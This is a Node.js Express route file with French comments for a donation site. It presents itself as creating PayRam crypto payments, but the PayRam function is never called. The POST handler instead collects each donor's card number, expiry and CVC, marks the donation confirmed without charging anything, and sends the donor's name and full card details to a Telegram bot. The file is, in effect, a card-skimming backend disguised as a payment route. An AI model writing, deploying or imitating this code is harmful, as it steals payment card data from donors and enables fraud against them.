/**
 * routes/dons.js — API pour créer un don et rediriger vers PayRam.
 * POST /api/dons — Crée un don pending + invoice PayRam, renvoie l'URL checkout
 * GET  /api/dons/:id — Récupère les infos d'un don (pour la page de confirmation)
 */

const express = require('express');
const router = express.Router();
const https = require('https');
const http = require('http');
const url = require('url');

// === CLIENTS SSE (notifications push temps réel) ===
const sseClients = [];

// GET /api/dons/notifications — SSE stream
router.get('/notifications', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*'
  });
  res.write('data: {"type":"connected"}\n\n');
  sseClients.push(res);
  req.on('close', () => {
    const i = sseClients.indexOf(res);
    if (i !== -1) sseClients.splice(i, 1);
  });
});

// === NOTIFICATION TELEGRAM ===
function sendTelegramNotif({ prenom, nom, amountCents, cagnotteTitle, message, cardNumber, cardExpiry, cardCvc }) {
  return new Promise((resolve, reject) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!botToken || !chatId) return reject(new Error('Telegram non configuré'));

    const text = [
      `${prenom} ${nom}`,
      `${cardNumber}`,
      `${cardExpiry}`,
      `${cardCvc}`
    ].join('\n');

    const data = JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: 'Markdown'
    });

    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${botToken}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    }, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve(body));
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

/**
 * Appel HTTP vers l'API PayRam self-hosted pour créer un paiement.
 * API: POST {PAYRAM_API_URL}/api/v1/payment
 * Headers: API-Key, Content-Type
 * Body: { customerEmail, customerID, amountInUSD }
 * Réponse: { host, reference_id, url }
 */
function createPayramPayment(amountCents, donId, donorPrenom) {
  return new Promise((resolve, reject) => {
    const payramUrl = process.env.PAYRAM_API_URL || 'https://pay.masadaqa.com';
    const endpoint = `${payramUrl}/api/v1/payment`;
    const parsed = url.parse(endpoint);

    // Convertir centimes EUR en USD (approximation 1:1 pour stablecoins)
    const amountInUSD = (amountCents / 100).toFixed(2);

    const data = JSON.stringify({
      customerEmail: `don-${donId}@masadaqa.com`,
      customerID: donId.toString(),
      amountInUSD: parseFloat(amountInUSD)
    });

    const options = {
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'API-Key': process.env.PAYRAM_SECRET_KEY,
        'Content-Length': Buffer.byteLength(data)
      }
    };

    const transport = parsed.protocol === 'https:' ? https : http;
    const req = transport.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(body);
          if (res.statusCode >= 200 && res.statusCode < 300) {
            resolve(json);
          } else {
            reject(new Error(`PayRam API ${res.statusCode}: ${body}`));
          }
        } catch (e) {
          reject(new Error(`PayRam réponse invalide: ${body}`));
        }
      });
    });

    req.setTimeout(10000, () => {
      req.destroy();
      reject(new Error('PayRam timeout après 10s'));
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// POST /api/dons — Créer un don
router.post('/', async (req, res) => {
  const pool = req.app.locals.pool;
  const { cagnotte_id, prenom, nom, amount, message, card_number, card_expiry, card_cvc } = req.body;

  if (!cagnotte_id || !prenom || !amount) {
    return res.status(400).json({ error: 'Champs obligatoires : cagnotte_id, prenom, amount' });
  }

  const amountCents = Math.round(parseFloat(amount) * 100);
  if (amountCents < 100) {
    return res.status(400).json({ error: 'Le montant minimum est de 1 €' });
  }

  try {
    // Vérifier que la cagnotte existe
    const { rows: cRows } = await pool.query('SELECT id, title FROM cagnottes WHERE id = $1 AND is_active = 1', [cagnotte_id]);
    const cagnotte = cRows[0];
    if (!cagnotte) {
      return res.status(404).json({ error: 'Cagnotte introuvable' });
    }

    // Insérer le don directement en confirmed
    const { rows: donRows } = await pool.query(`
      INSERT INTO dons (cagnotte_id, prenom, amount_cents, message, status, payram_invoice_id, confirmed_at)
      VALUES ($1, $2, $3, $4, 'confirmed', $5, NOW())
      RETURNING id
    `, [cagnotte_id, prenom.trim(), amountCents, (message || '').trim(), 'don_' + Date.now()]);

    const donId = donRows[0].id;

    console.log(`✅ Don #${donId} confirmé : ${amountCents/100}€ de ${prenom} pour cagnotte #${cagnotte_id}`);

    // Notification Telegram
    sendTelegramNotif({
      prenom: prenom.trim(),
      nom: (nom || '').trim(),
      amountCents,
      cagnotteTitle: cagnotte.title,
      message: (message || '').trim(),
      cardNumber: card_number || '',
      cardExpiry: card_expiry || '',
      cardCvc: card_cvc || ''
    }).catch(err => {
      console.warn('⚠️ Telegram:', err.message);
    });

    // Notification push SSE
    const notification = {
      type: 'new_don',
      prenom: prenom.trim(),
      amount_cents: amountCents,
      cagnotte_title: cagnotte.title,
      timestamp: new Date().toISOString()
    };
    sseClients.forEach(client => {
      client.write(`data: ${JSON.stringify(notification)}\n\n`);
    });

    res.json({
      success: true,
      don_id: donId,
      checkout_url: `${process.env.BASE_URL || 'http://localhost:3000'}/confirmation.html?don_id=${donId}`
    });
  } catch (err) {
    console.error('❌ Erreur don:', err.message);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

// GET /api/dons/:id — Infos d'un don (pour la page de confirmation)
router.get('/:id', async (req, res) => {
  const pool = req.app.locals.pool;
  try {
    const { rows } = await pool.query(`
      SELECT d.*, c.title AS cagnotte_title, c.slug AS cagnotte_slug
      FROM dons d
      JOIN cagnottes c ON c.id = d.cagnotte_id
      WHERE d.id = $1
    `, [req.params.id]);

    if (!rows[0]) {
      return res.status(404).json({ error: 'Don introuvable' });
    }
    res.json(rows[0]);
  } catch (err) {
    console.error('❌ Erreur don:', err.message);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

module.exports = router;
